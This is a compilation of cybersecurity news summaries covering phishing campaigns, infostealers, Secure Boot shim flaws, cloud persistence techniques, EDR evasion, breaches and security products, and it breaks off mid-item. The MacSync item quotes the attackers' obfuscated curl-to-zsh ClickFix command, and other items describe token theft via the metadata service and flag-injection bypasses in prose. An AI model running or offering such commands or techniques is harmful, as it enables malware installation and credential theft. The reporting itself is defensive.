31b4d6885ac7.text:
Chen Doytshman explains how Anthropic's Claude Tag operates differently from traditional per-user integrations. Rather than acting under individual credentials, Claude Tag functions as a multiplayer agent using admin-configured access bundles in Slack channels.

Key Access Model Differences: Claude Tag employs a "service-identity pattern" distinct from OAuth delegation. As Doytshman notes, "One admin-configured bundle serves everyone in the channel" rather than each user's personal permissions. This creates a three-layer identity structure: workspace installation, access bundles (connector credentials), and scopes defining Slack contexts.

Security Implications: The article emphasizes that "channel configuration is now part of your access-control surface." Adding users to channels grants them ability to direct Claude within the admin-defined scope, but doesn't expand Claude's capabilities. Organizations can layer additional controls through required claude.ai login and role-based access control.

Recommended Security Practices: Doytshman recommends four immediate actions: auditing access bundles and their scopes, reviewing channel membership alongside bundle permissions, implementing minimum-privilege bundle configurations per channel, and preferring per-user delegation where feasible.

The piece concludes by noting Anthropic's planned enhancements: just-in-time credential grants and identity-aware overlays for additional user-level checks.

Author: Chen Doytshman, Senior Security Researcher at Tenable. Published: July 15, 2026.

9d520006e2ed.text:
A six-month phishing operation has been deceiving Windows and macOS users into installing legitimate remote monitoring and management (RMM) software through fake electronic greeting cards (eCards).

According to research published by Forescout on July 14, the campaign, dubbed SeasonalInvite, has been active since at least January 2026 and continued serving payloads into late June. The operation's distinctive approach involves rotating lures aligned with the calendar, transitioning from tax and Social Security themes in winter to Valentine's, Easter and spring-related invitations as seasons change.

Researchers identified 959 domains used in phishing emails and poisoned search results. Victims encountered a traffic distribution system (TDS) that screened traffic before directing them to a counterfeit BlueMountain greeting card page. The page displayed a loading animation and automatically downloaded an operating-system-specific installer after three seconds.

Legitimate Tools, Attacker Consoles: The investigation confirmed abuse of four commercially signed RMM products: "ConnectWise ScreenConnect, LogMeIn Resolve, Kaseya and German tool O&O Syspectr." The genuinely signed installers bypassed conventional security checks that would flag malware.

On Windows, batch and VBScript droppers retrieved installers and triggered User Account Control (UAC) prompts, requiring victims to approve privileged installation. For macOS, attackers paired a signed Kaseya package with a separate config.data file redirecting enrollment to attacker servers, exploiting unattended-deployment features intended for managed service providers.

Landing pages silently harvested visitor IP addresses, cities, and browser information, logging this data to backend servers.

Signs of an AI-Assembled Kit: The phishing pages displayed indicators of AI-generated code, including "emoji-prefixed task comments and references to combining a 'first snippet' and 'second snippet.'" Forescout assessed that operators likely employed large language models to assemble code fragments into single landing pages with operating-system detection, Telegram-based reporting, and animation capabilities, reducing production costs for variants.

The TDS platform appears to be a larger shared infrastructure. Searching for matching gate-page fingerprints returned 2658 URLs. Many appeared innocuous to automated scanners while routing actual users onward. Since not all carried SeasonalInvite fingerprints, the system may simultaneously serve multiple unrelated phishing campaigns.

Defensive Recommendations: Forescout urged organizations to maintain approved RMM tool inventories and alert on unauthorized ones, strengthen email filtering against seasonal themes, and educate staff that genuine eCards never require remote support software installation or elevation prompts.

Author: Alessandro Mascellino, News Reporter. Published: July 15, 2026.

7ba14ed4108f.text:
LabubaRAT, a previously undocumented Rust-based remote access tool masquerading as NVIDIA software, has been uncovered by Blackpoint Cyber. According to researchers, the malware creates "a reusable foothold for hands-on activity" and enables post-compromise operations on Windows systems.

Once deployed, LabubaRAT can profile the host, identify installed security tools, receive operator commands, transfer files, capture screenshots, and proxy network traffic. Blackpoint Cyber named the malware after discovering a "LabubaPanel" title and Labubu-themed favicon on its command-and-control infrastructure.

Rather than hardcoding infrastructure into the binary, LabubaRAT receives configuration through command-line arguments or environment variables at launch. This design allows operators to reuse the same compiled binary across different infrastructure and campaign groupings.

After enrollment, the malware stores local state in a SQLite database named nvctr_sys.db and supports communication over HTTPS polling, Microsoft Edge WebView2, and DNS tunneling.

LabubaRAT offers comprehensive capabilities including command execution, PowerShell and JavaScript execution, screenshot capture, file transfers, and SOCKS5 proxy support. It can establish persistence through Windows Run registry keys.

The attack vector is an unsigned executable named nvidia-sysruntime.exe that impersonates NVIDIA's container runtime toolkit. Before receiving commands, LabubaRAT profiles the compromised system by checking for browsers and endpoint security products including Microsoft Defender, CrowdStrike, and SentinelOne, while collecting hostname, CPU, memory, domain, and UAC status information.

Researchers concluded the framework-like architecture suggests LabubaRAT was designed for reuse across multiple operations.

Author: Sinisa Markovic, Managing Editor, Help Net Security. Published: July 15, 2026.

5379f32afb7c.text:
Zscaler's Threat Hunting team identified a sophisticated attack campaign exploiting Anthropic's Claude platform through shareable chats to distribute MacSync Stealer malware to macOS users.

Attack Overview: The threat actors leveraged malvertising to target users searching for Claude-related terms. When victims clicked paid ads, they were directed to shared Claude chats appearing to originate from "Apple Support" that contained ClickFix instructions—commands designed to appear harmless while actually triggering malware installation.

Key Characteristics: Distribution Method: The attack used Google Ads with seven unique search terms including "claude," "claude ai," and "claude code desktop mac." Campaign Duration: June 12-19, 2026. Command Format: Victims were instructed to run obfuscated curl commands: "curl -kfsSL $(echo '[base64_string]'|base64 -D)|zsh"

Malware Capabilities: MacSync Stealer targets extensive user data including Keychain credentials and browser password storage; SSH, AWS, and Kubernetes configuration files; cryptocurrency wallet information (both browser extensions and desktop applications); sensitive documents from Downloads, Documents, and Desktop folders; and Telegram application data.

Technical Details: The infection chain involves three stages: an initial stage downloads a zsh script from attacker-controlled domains; a second stage executes the stealer while hiding all output; a third stage collects data, implements persistence through ~/.zshrc modification, and exfiltrates stolen information in 10MB chunks.

Attribution Indicators: Russian-language code comments suggest the threat actors are likely Russian-speaking. The campaign utilized 150+ malicious domains adopting themes related to U.S. local services.

Zscaler notified Anthropic about the misuse, and the shared chats were subsequently removed.

Author: Ruchna Nigam, Principal Security Researcher. Published: July 15, 2026.

a21904b4e7a0.text:
Attackers could bypass UEFI Secure Boot on numerous systems due to 11 Microsoft-signed UEFI shim bootloaders containing vulnerabilities dormant for over a decade, according to ESET researchers. The shims were reported to CERT/CC in February 2026. All versions are 0.9 or below and were signed under Microsoft's Corporation UEFI CA 2011 third-party certificate, meaning any UEFI system trusting that certificate will accept them regardless of the operating system installed.

Successful exploitation allows untrusted code execution during boot, enabling UEFI bootkits such as Bootkitty, HybridPetya, and BlackLotus to operate even with Secure Boot enabled.

A shim functions as a small first-stage bootloader that Microsoft signs once, permitting Linux distributions to boot under Secure Boot without requiring every update to be signed. However, an attacker can introduce a vulnerable shim to any system containing the Microsoft third-party certificate and boot from it.

The actual risk centers on outdated second-stage bootloaders each shim still trusts, primarily GRUB 2. Signing timestamps span 2013 to 2025, with older GRUB 2 builds containing well-documented vulnerabilities.

ESET demonstrated this using Oracle Linux's shim, which trusts a GRUB 2 binary vulnerable to "a 2015 flaw allowing unsigned code to load via crafted multiboot modules." The attack requires no memory corruption or reverse engineering—an attacker simply builds an unsigned kernel image, copies it with the old shim and GRUB 2, and loads it via a single boot command.

The shims also bypass newer security mechanisms. Machine Owner Key (MOK) denylist enforcement only arrived in version 0.9, so older shims ignore it. Similarly, Secure Boot Advanced Targeting (SBAT), introduced in shim 15.3, remains unchecked by earlier versions.

Visibility poses a deeper challenge. Shim submissions have been transparently cataloged only since 2017, and the total number of older, still-trusted shims remains unknown.

Two CVE IDs—CVE-2026-8863 and CVE-2026-10797—cover the reported shims. Microsoft revoked the vulnerable binaries in its June 9 Patch Tuesday dbx update. Windows machines update automatically, while Linux users can obtain the revocation through the Linux Vendor Firmware Service.

ESET stated: "As the vulnerable shims are part of legitimate software packages that are potentially present on thousands of systems that have never been compromised via these loaders, we are not providing indicators of compromise to avoid massive misidentification."

Author: Alessandro Mascellino. Published: July 15, 2026.

85a89e0c388d.text:
Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including Local and Remote File Inclusion (LFI/RFI) and Command Injection. Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance, serving as a foothold that may ultimately lead to a full compromise of the victim's cloud environment.

This blog post describes attack scenarios and provides actionable guidance on how to secure serverless environments, focusing on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible.

Example Attack Scenarios: In a Local File Inclusion (LFI) example, a Python/Flask function accepts a user-controlled 'file' parameter and opens it without validation, allowing attackers to retrieve arbitrary files including main.py, requirements.txt, .env files, and /etc/passwd via directory traversal. In a Command Injection example, a function uses subprocess.run with shell=True on unsanitized user input, letting an attacker run curl against the GCP metadata service to steal the service account's OAuth 2.0 bearer token, potentially leading to a full GCP project takeover if the service runs as the default Compute Engine service account with Editor permissions.

Hardening Recommendations: Mandiant recommends a Secure Software Development Lifecycle (S-SDLC) with security scanning and least-privilege IAM in CI/CD; multi-layered controls for AI-generated ('vibe coding') code including sandboxed experimentation and egress controls; segregating public-facing services into isolated GCP projects; using custom least-privilege service accounts instead of the default Compute Engine account; restricting ingress to internal-only behind a Layer 7 Application Load Balancer with Cloud Armor WAF (citing lfi-v33-stable and rce-v33-stable preconfigured rules); using VPC Service Controls to limit lateral movement; and enabling Cloud Run Threat Detection in Security Command Center Premium/Enterprise tiers.

Author: Corné de Jong (Mandiant). Published: July 16, 2026.

b1db6d84e4d6.text:
A financially motivated threat actor impersonated 292 brand repositories on GitHub to distribute an infostealer malware. The campaign targets users searching for legitimate software downloads through SEO-optimized results.

Attack Mechanism: The scheme works by hosting fake repositories with concealed download links. Users are directed through GitHub pages and threat-actor-controlled domains to counterfeit "secure download" pages offering ZIP archives containing legitimate signed files bundled with trojanized DLLs. When executed, the malware loads an infostealer "entirely in memory" without establishing persistence.

Capabilities: The malware collects browser credentials, cookies, cryptocurrency wallet data, Steam tokens, Discord credentials, and files containing keywords like "password" and "wallet." All data exfiltrates to a C2 server using a hardcoded Russian IP address.

Detection & Response: Arctic Wolf notes the malware leaves a "recoverable forensic footprint" through temporary folders. They advise rotating credentials, assuming all stored passwords and cryptocurrency keys are compromised, and sourcing software exclusively from vendor-verified channels.

Ongoing Challenges: GitHub removal efforts remain reactive. Arctic Wolf recommends treating recent .github repositories with sparse commit histories as suspicious and avoiding executables from ZIP archives regardless of branding.

25d62d20cf92.text:
Socure has launched Remote Verifier in RiskOS, a new identity verification tool designed for organizations to verify identities requiring additional review while reducing manual effort.

2e0f5c31ac1f.text:
Xint.io has launched Xint Pulse, a black-box autonomous penetration testing tool that provides product security teams with on-demand security assessments of their applications. Unlike the company's enterprise platform, which is designed for continuous testing, Xint Pulse is intended for timely, one-off penetration tests.

Organizations of all sizes, from startups to large enterprises, can now perform a scan of their applications with the same Xint technology that was named Best Automated Pentesting Platform by The Hacker News in June of 2026 and found high-severity (7.0+ CVSS score) vulnerabilities in widely-used software like Linux, Android, iOS, PostgreSQL, Redis, and MariaDB.

Xint Pulse uses LLMs combined with a proprietary orchestration engine to identify, reproduce, validate and understand critical security vulnerabilities in web application code. The tool can "analyze millions of lines of source code, configuration files and binaries in less than 12 hours" with depth comparable to human penetration testers.

Priced at $3,000 per application scan, Xint Pulse serves organizations needing one-time tests for compliance submissions, vendor assessments, pre-release validation, or smaller organizations unable to afford traditional pentesting. The service allows one application scan with up to three retests within a 30-day period.

Customers receive compliance-ready reports with severity scores, exploit trigger conditions, impact assessments, and remediation suggestions. Teams have reportedly created proof-of-concepts in 15 minutes and patched bugs within 30 minutes.

White-box testing capabilities are planned before year-end, enabling source code scanning at the code level.

Published: July 15, 2026.

c83f154acff4.text:
What is a business-logic flaw?
Most vulnerability classes involve something malformed—an injection, overflow, or broken token. Business-logic flaws differ fundamentally: nothing is broken, nothing seems wrong. The request is perfectly valid, and the server does exactly what it is asked. However, the flaw exists because the system should never have honored the request in the first place. These bugs reside in the gap between what an application is supposed to allow and what it actually enforces. Discovering these flaws requires reasoning about application intent—understanding what the system is designed to protect and then testing whether it actually does.

What did the Red Agent discover?
The Red Agent scanned a B2B platform containing hundreds of millions of business emails and verified phone numbers. It discovered an authorization bypass allowing free-tier users to access unmasked contact data without payment. The platform's business model depends entirely on gating this data via a credit system. However, the mechanism governing reveals relied on a single parameter flag in the API request that the backend accepted without verifying entitlements. By adding this value to a standard free-tier search, the restriction was completely bypassed, returning unmasked business emails, direct phone lines, and personal email addresses in cleartext.

Scope of Exposure: Business email addresses 600M+, direct phone numbers 135M+ verified, personal email addresses leaked by default in ~50% of records, plus company intelligence (revenue, headcount, direct lines, addresses).

How did it find the exploit? The Red Agent worked from a free-tier account with zero prior knowledge through reconnaissance, hypothesis generation, and exploitation. It mapped the API surface via 130MB of frontend JS bundles, extracting 100+ endpoint paths including internal prefixes like /api/internal/data/hPeopleSearch. It found a parameter (e.g., unmaskContactData) referenced in code but never used in standard flows, hypothesized the backend might trust it, established a masked baseline response, then replayed the request with 'unmaskContactData: true' injected. The server honored the flag without checking credit balance or tier entitlements, returning fully unmasked records. The platform's security team remediated the issue within two hours of triage.

Why this matters: The compromise traces to the backend trusting a client-controlled value—an authorization check that was never written. Automated scanners see a valid request to a legitimate endpoint and register it as clean traffic; static analysis cannot evaluate business rules. Wiz argues autonomous AI pentesting agents can reason about intent across entire application ecosystems at machine speed and scale, which is necessary both to find these flaws proactively and to counter AI-powered adversaries who can do the same.

Key Takeaways: Business-logic flaws are a blind spot for SAST/DAST/signature tools; entitlement, pricing and access decisions must be enforced server-side per record and never inferred from what the interface sends; AI attackers can already find these assumptions at machine speed, so defenders need identical capability directed inward.

f98c35f74e17.text:
F5 has unveiled fleet management capabilities for F5 Insight for ADSP to help enterprises minimize risk across F5 BIG-IP environments as advanced AI compresses vulnerability response timelines.

The new workflows provide security and operations teams with fleet-wide visibility, guided update management, enterprise authentication, role-based access controls, and a tamper-evident AI audit trail. This allows customers to progress from identifying risk to taking responsible action across large, distributed application delivery and security fleets.

These capabilities build on F5's transition to monthly hardened software releases and reflect broader changes in how the company helps customers respond to AI-accelerated threats. As vulnerability response windows shrink, enterprises require more than faster fixes—they need operational control to understand exposure, prioritize updates, execute changes safely, and maintain clear action records across complex environments.

According to Kunal Anand, Chief Product Officer at F5: "Frontier AI has fundamentally altered both sides of cybersecurity. It gives defenders powerful new ways to harden software, and it gives attackers faster ways to find and exploit vulnerabilities."

Fleet Management Features: F5 Insight for ADSP v1.2 introduces fleet-wide software lifecycle visibility, guided update workflows for staged deployments, pre-execution readiness checks aligned to fleet and HA architectures, and update status tracking across maintenance windows.

Governance Controls for AI Operations: The platform now offers governance-grade controls including enterprise authentication via LDAP and SAML SSO, role-based access controls for least-privilege access, and tamper-evident AI audit trails with 30-day retention.

Operational Intelligence: F5 Insight delivers unified observability and AI-driven intelligence through MCP integration and support for popular large language models, enabling teams to query fleet data in natural language and receive prioritized action plans.

Mozilla has released updates addressing two critical Firefox vulnerabilities with publicly available exploit code: CVE-2026-15718, an invalid pointer flaw in the JavaScript/WebAssembly component, and CVE-2026-15719, a site isolation issue in the DOM Navigation component. "We are aware that exploit code for this is public, however we are not aware of any attacks in the wild abusing this flaw," according to Mozilla's advisory. Both issues are patched in Firefox 152.0.6.

Google simultaneously shipped fixes for 15 security flaws, including two critical use-after-free bugs in Ozone (CVE-2026-15764 and CVE-2026-15765)—a cross-platform abstraction layer supporting Linux, ChromeOS, and Fuchsia. The vulnerabilities "allowed a remote attacker who convinced a user to engage in specific UI gestures to potentially exploit heap corruption via a crafted HTML page." Chrome versions 150.0.7871.124/.125 contain the patches.

Adobe published security updates for 88 vulnerabilities, including eight critical ColdFusion flaws with CVSS scores ranging from 9.0 to 9.9. Notable issues include path traversal (CVE-2026-48318), code injection (CVE-2026-48322), and SQL injection (CVE-2026-48324) vulnerabilities potentially enabling arbitrary code execution. ColdFusion 2025 Update 11 and ColdFusion 2023 Update 22 contain fixes. Adobe also addressed critical flaws in Commerce, Experience Manager, and other products.

24195d12ea42.text:
Bitdefender researchers have identified three attack techniques exploiting Windows bind links—a legitimate kernel-level redirection feature—to evade endpoint detection and response (EDR) products.

Bind links create virtual paths that map to actual backing paths. When attackers manipulate these mappings to point toward malicious files, they can hide malware while EDR systems see only trusted, benign file paths.

Three Attack Techniques:
File-Binding (Path Hijacking): Attackers redirect trusted DLL paths to malicious versions. For example, they can hijack AMSI.dll used by PowerShell, neutralizing antimalware scanning without modifying the actual security component. The EDR sees the legitimate path while receiving data from the attacker's fake DLL.

Process-Binding: This extends file-binding to executable images. An attacker might redirect a trusted process like Winver.exe to point elsewhere. When EDR checks the file path, it appears legitimate and finds nothing amiss, rendering the actual malicious payload invisible.

Silo-Binding: The most sophisticated approach, requiring administrator access and a user-defined Windows silo. This creates isolated filesystem views where a trusted path resolves to malware inside the silo but to clean files outside it. This bypasses AppLocker, Windows Firewall, and Sysmon detection.

Microsoft's Response: Microsoft classified the findings as low severity since the attacks require local administrator privileges. However, Bitdefender counters that ransomware groups routinely obtain admin access and use EDR-killing tools as standard attack components—making this a practical threat, not theoretical.

The researchers demonstrated that standard Mimikatz detection failed when silo-binding was employed, confirming the evasion effectiveness.

66087c70e9e3.text:
The article examines how attackers establish persistent access in AWS environments through four primary techniques:

IAM User Persistence: Attackers create new IAM users via iam:CreateUser API calls, then add credentials and permissions. Follow-up actions typically include credential addition (iam:CreateAccessKey and iam:CreateConsoleProfile) and permission assignment (iam:AttachUserPolicy, iam:PutUserPolicy, iam:AddUserToGroup). The article provides LEQL queries to track user creation and subsequent actions, recommending that defenders review activity patterns, examine authentication anomalies, apply deny-all policies to compromised accounts, rotate credentials, and remove unauthorized users.

Assume Role Policy Modification: Threat actors modify IAM role trust policies to allow external AWS accounts to assume roles. The article shows how attackers can either create backdoored roles or update existing policies using iam:UpdateAssumeRolePolicy. Detection requires searching for suspicious principal IDs and tracing activity from attacker-controlled accounts.

Lambda Function Abuse: Malicious actors upload code to Lambda functions that create privileged IAM users when invoked. The article demonstrates sample Python code that generates admin credentials and returns login URLs. Attackers trigger functions through public URLs created via lambda:CreateFunctionUrlConfig or API Gateway integrations using apigateway:CreateIntegration.

Federated User Session Creation: Using sts:GetFederationToken, attackers create temporary credentials that persist even after deleting original access keys. The article explains that "temporary credentials remain usable until they expire, unless their effective permissions are blocked."

Response Recommendations: Organizations should regularly audit IAM permissions and trust policies, implement Service Control Policies as preventative guardrails, apply deny-all policies to compromised identities immediately, rotate or delete affected access keys, and remove additional persistence mechanisms.

4781d91fc07a.text:
Orca has extended its AI security platform with integration to Claude's Compliance API, as detailed in a separate blog post.

Key Findings: Supply chain attacks increasingly weaponize legitimate packages by releasing malicious new versions rather than exploiting known vulnerabilities, creating detection gaps in most AppSec tools. Recent campaigns like Mini Shai-Hulud (May 2026) and the @redhat-cloud-services npm compromise (June 2026) show malicious packages execute payloads on install before application code runs. Traditional AppSec tools including SAST, SCA, and secrets scanners were designed to detect insecure code, not intentionally weaponized dependencies. Orca AppSec now detects and blocks malicious packages across IDE, pull requests, and CI/CD pipelines with full dependency tree coverage and "Path to Root" visualization. The malicious package detection policy defaults to Block mode, providing protection without additional configuration.

Why Traditional Tools Fall Short: Modern AppSec programs excel at finding vulnerabilities but share a fundamental assumption: packages behave as intended. CVEs describe flaws in legitimate packages written in good faith. Malicious packages differ fundamentally—they may have no CVEs, appear legitimate initially, and execute harmful payloads immediately upon installation, before security controls intervene.

Recent Attack Campaigns: Mini Shai-Hulud (May 2026) was a coordinated worm that compromised TanStack, Mistral AI, UiPath, and over 160 npm and PyPI packages; the initial payload executed on npm install with no CVE, stealing npm and GitHub tokens within minutes and auto-publishing more malicious versions. The @redhat-cloud-services Compromise (June 2026) affected 32 packages through unauthorized commits, with a Miasma payload embedded as a preinstall script triggering before any application code executed. Neither attack exploited known vulnerabilities.

Orca's Solution - Four Key Capabilities: Secure by Default (Block mode ships by default, failing CI builds and blocking PR merges for known malicious packages); Full Dependency Tree Coverage (scans complete dependency trees across npm, PyPI, Maven, NuGet, Go, Cargo, and RubyGems, storing the full path from root manifest to offending package); Path to Root Visualization (displays the full dependency path visually and inline in the terminal); Integrated Where Developers Work (detection fires at PR creation, push/merge, CI pipelines, CLI, and IDE, with a Quick Fix option).

The article concludes that while most organizations have layered defenses across code, dependencies, secrets, and infrastructure, those tools assumed the packages being analyzed are legitimate. Malicious package detection adds the missing dimension by covering packages designed to cause harm.

42f9f4ca8474.text:
Identity-based attacks have become cybercriminals' primary method for launching ransomware campaigns. According to Sophos analysis, "79% of ransomware attacks can be traced back to an initial intrusion which exploited compromised identities and legitimate user logins."

Malicious emails now account for 26% of ransomware entry points, up from 19% previously. Phishing attacks—often used to steal credentials—caused 24% of incidents, rising from 18%. Brute force attacks represent 23% of cases, slightly down from 22%.

Meanwhile, exploitation of known vulnerabilities dropped significantly from 32% to 18%, indicating a strategic shift by attackers toward targeting humans rather than systems.

Attackers leverage compromised identities to access exposed applications (38%), remote device logins (30%), firewalls (21%), VPNs (8%), and IoT devices (3%).

Key organizational vulnerabilities include security gaps (62% of surveyed leaders), resource constraints (58%), and insufficient cybersecurity protections (57%).

For recovery, 48% of victimized organizations paid ransoms, while 66% used backups to restore encrypted data. Median ransom demands fell to $698,000 from $2 million two years prior, though large organizations still face multimillion-dollar demands.

Sophos recommends prioritizing identity threat detection and response, enforcing multi-factor authentication, and auditing credentials to prevent attacks.

d07253ae71aa.text:
It’s common for victims and threat actors to disagree sharply over the scope of an attack or its significance. Today’s example involves Israeli fintech Nayax and a group called The Syndicate.
In previous coverage, DataBreaches cited Nayax’s submission to the Securities and Exchange Commission. At the time, Nayax reported an incident involving an unnamed subsidiary, but reported:
The investigation is ongoing, and the scope of the information involved in the event is still being determined. At this time the company does not believe there is exposure of material information.
The company’s production environment and its core systems have not been affected by the event. The company’s business activity continues as normal, without impact to the company’s business operations.
Their interim assessment seemed inconsistent with what The Syndicate reported on its leak site, where they claimed 1 billion card data records, including full PAN, EXP, and “other card datas” as well as transaction histories, full know your customer (KYC) data, and other records in the 100 TB of data they claimed to have exfiltrated.
Because they had not provided any proof of claims to back up their leak site claims, DataBreaches asked The Syndicate to provide some proof of claims, including for the 1 Billion card data claim.
In response, The Syndicate provided DataBreaches with three screenshots. The first is a payments accounting report for Adyen, the Dutch payment company:
The second screenshot is of card data. The Syndicate redacted some of the field names and columns, but the CardPan column is shown and the CardNumberClear column is shown. The CardPan numbers appear to be redacted by Nayax.
The third screenshot is from KYC data. The Syndicate claims they obtained personal identification documents, names, addresses, dates of birth, verification photos, and full customer identity profiles. The Syndicate also uploaded the proof of claims to its leak site.
In response to additional questions DataBreaches asked them, the group repeated their claim that they were in Nayax’s system from September 2025 to June 2026. They also provided DataBreaches with some information on themselves. Specifically, they stated that they do not operate as RaaS, and they have no affiliates or third parties. “We handle everything ourselves, target selection, breach, exfiltration,” they told DataBreaches.
And although the name is relatively new, they claim the group has been together for many years, and has executed many major breaches over the years. In response to DataBreaches’ standard question about whether they have any rules prohibiting sectors or countries, they responded, “We don’t target hospitals or critical infrastructure, anything that directly endangers lives, our focus is on financial services, tech, retail, companies with real capital, and we don’t target CIS countries.”
When asked what they would like people to know that DataBreaches didn’t ask about, they responded, “That we’re selective, we don’t hit random targets. Every breach is calculated, and people might recognize us by other names too, we have operated under different identities over the years. The Syndicate is just one of them, that’s all we will say on that.”
And that’s all they’re saying for now in terms of proof of claims, it seems, telling DataBreaches, “This is all we’re releasing publicly right now. It’s enough to prove NAYAX lied to the SEC about the breach being contained. The complete unredacted dataset (100TB), releases July 21st, everyone sees everything then.”
In its update yesterday, Nayax wrote, in part:
As the Company’s investigation progressed, and while the precise scope and complete contents of the exfiltrated information are still under investigation, findings have emerged indicating that such exfiltrated information includes a copy of a backup of scanned documents, additional business-related information, and mainly back up of payment transaction records which does not include sensitive payment authentication data (such as cardholder names, CVV values or ID information), as such information is generally not retained within the Company’s systems. In addition, a significant portion of the transactions were conducted using digital wallets, such as Apple Pay and Google Pay, in which the payment credentials consist of single-use tokens that have no value if disclosed. Based on its investigation to date, the Company confirms that all customer safeguarded funds were untouched and that no unauthorized access to those accounts occurred.
DataBreaches emailed Nayax and included a screenshot of the card data to ask whether the kinds of data revealed there posed any risk. Aaron Greenberg, Chief Strategy Officer for Nayax, replied, “With regards to the credit card information, the information shown is predominately card present EMV transaction history logs, which do not contain information needed to conduct fraudulent transactions, such as first name, last name, or CVV. Nayax is almost entirely card present payments, with payments for example via Apple Pay or Google Pay. Random 16 digit numbers alone aren’t enough to conduct transactions.”
It sounds like The Syndicate did not acquire a great deal (if any) card data that could be problematic for consumers. But we won’t find out how much KYC or other types of info they acquired until they leak it on July 21, as Nayax has also publicly stated that they will not pay any extortion demand:
The Company’s Board of Directors has resolved not to comply with criminal extortion demands. The Board believes that complying with such demands would not be consistent with the long-term best interests of the Company’s customers, partners, employees and shareholders.
The Company has incurred, and may continue to incur, costs related to responding to, remediating, and investigating this attack. The full financial impact-including insurance or indemnification offsets and any effect on customer behavior-is not yet determined, but the Company does not currently expect a material effect on its financial condition or results of operations.

Radware has announced a new cloud-augmented protection architecture for DefensePro X, extending the platform with new AI-powered cloud algorithms while keeping traffic inspection and mitigation locally within customer premises.

The first such service released is Cloud Web DDoS Protection for DefensePro X designed to improve characterization and real time footprint generation of sophisticated application-layer distributed denial-of-service (DDoS) attacks without requiring organizations to reroute traffic through the cloud.

Web DDoS attacks continue to evolve as attackers increasingly use AI, encrypted traffic, distributed infrastructure, and techniques designed to mimic legitimate users. These attacks may challenge traditional defenses, potentially making them difficult to detect through local visibility alone.

Cloud-based protection can improve detection but often requires traffic redirection or access to customers' private keys, which may introduce operational complexities for organizations with strict privacy, compliance, or data sovereignty requirements. Until now, these customers had to compromise on the strength of their security posture.

Radware's cloud-augmented architecture combines AI-powered cloud algorithms with DefensePro X's inline enforcement capabilities. Backed by Radware's global cloud network of over 65 cloud centers, Cloud Web DDoS Protection for DefensePro X enables customers to gain broader visibility into sophisticated attacks while keeping traffic inspection, mitigation, and private keys on premises.

According to Gabi Malka, Radware's chief operating officer: "By extending DefensePro X with cloud-augmented protection, Radware gives customers access to cloud-powered intelligence while helping to preserve the speed, privacy, and control of inline enforcement."

Key benefits include: cloud-based intelligence for advanced Layer 7 attack detection; real-time, adaptive Layer 7 mitigation support; on-premises control of traffic and TLS private keys; simplified integration with existing DefensePro X deployments; cloud-augmented architecture designed to support future capabilities.

The solution targets enterprises requiring advanced application-layer protection without sacrificing operational control, particularly those with strict compliance or data sovereignty requirements, applications behind CDNs and proxy architectures, and teams defending against sophisticated encrypted Web DDoS attacks.

e44da84a2566.text:
Progress has restored access to its ShareFile Storage Zones Controller following a four-day security suspension. ShareFile is Progress' primary enterprise file-sharing service, with Storage Zones Controller providing customers private data storage capabilities.

On July 10, Progress Software identified what they described as "a credible external security threat," prompting a temporary service suspension that lasted until July 14.

The company confirmed discovering a high severity path traversal vulnerability impacting Storage Zones Controller versions 5.x and 6.x. Progress stated: "We developed and released patched versions to customers and once patched, these customers' Storage Zones Controllers will be operational."

Patched versions are available as 5.12.5 and 6.0.2.

Progress has not yet disclosed a Common Vulnerabilities and Exposures (CVE) identifier. According to statements to BleepingComputer, the company is delaying CVE publication to allow customers time to patch before threat actors access vulnerability details.

Regarding potential compromise, Progress told Infosecurity: "At this time, we have no evidence of unauthorized access to any Share File customer account or data, and we have not identified any active threat."

This incident reflects Progress' broader security challenges, including the 2023 MOVEit Transfer breach exploitation and an April 2026 critical MOVEit Automation vulnerability.

8ef6172b92e4.text:
The US Justice Department on Tuesday unsealed an indictment charging three Russian nationals and two companies for allegedly running cybercrime services.

The individuals are Aleksandr Alexandrovich Volosovik, Kirill Andreevich Zatolokin, and Yulia Pankova, and the targeted companies are ML.Cloud and Media Land, whose infrastructure spanned countries such as China, the Netherlands, Finland, and even the United States.

The three suspects are accused of running ML.Cloud and Media Land, which allegedly provided bulletproof hosting services to a wide range of threat actors, including profit-driven gangs and state-sponsored groups.

ML.Cloud and Media Land infrastructure was used for phishing, DDoS attacks, brute-force attacks, ransomware, and hosting cybercrime marketplaces and forums, according to the DOJ.

Authorities said threat actors leveraged the two services to target at least 42 entities across 21 US states, overall causing tens of millions of dollars in losses.

The indictment targeting Volosovik, Zatolokin, and Pankova was returned in December 2024, but it was only unsealed now. However, this is not the first time the names of the suspects and their companies have been made public.

In late 2025, the United States and its allies announced sanctions against them, along with other individuals and companies tied to criminal activities.

The US also announced on Tuesday that it's offering a reward of up to $10 million and possible relocation for information on the ML.Cloud and Media Land operators.

efb0293589fb.text:
Spanish National Police have dismantled a cybercrime network accused of stealing and laundering approximately €140 million through fake investment platforms, CEO fraud, invoice fraud, and man-in-the-middle attacks.

Four individuals were arrested during the operation: two in Portugal, one in Spain, and one in Panama.

The investigation commenced after officers identified 19 companies whose financial activity seemed consistent with money laundering rather than legitimate business operations. Investigators reviewed bank records, examined company registrations and account-opening procedures, conducted surveillance, employed wiretaps, and collaborated with international partners to identify the network's operators and money mules.

According to police statements, "The suspects created and managed a network of over 800 bank accounts into which they received significant amounts of illicit funds defrauded from numerous victims." The stolen money was immediately dispersed and concealed through another network of bank accounts, creating transaction chains that obscured the criminal capital.

Officers executed raids at six locations across Barcelona, Girona, and Tarragona in Spain, plus Porto, Portugal, where the suspected leader had relocated. A separate Panama arrest was made with Interpol and local authority assistance.

Investigators have identified more than €94 million flowing through the network, plus €61 million defrauded in 2024 via CEO fraud schemes. Officers seized over 170 smartphones and 15 computers used for fraudulent transactions, and froze €3 million in stolen funds designated for victim restitution.

The investigation remains active as law enforcement continues examining the group's international connections.

a8c6c8d6a9b2.text:
Nudge Security has announced new agentic capabilities to help security and IT teams find and remediate malicious and high-risk OAuth grants and browser extensions, two of the fastest-growing and hardest to manage attack surfaces in the enterprise.

The new agents continuously analyze OAuth grants and browser extensions discovered by Nudge Security, flag what's risky, and automate remediation with human-in-the-loop decisions. The new agents join Nudge Security's Vendor Risk Analyst agent, which automatically builds vendor security profiles for newly discovered AI and SaaS apps, cutting manual security review time by up to 90%.

Closing the gap between discovery and action

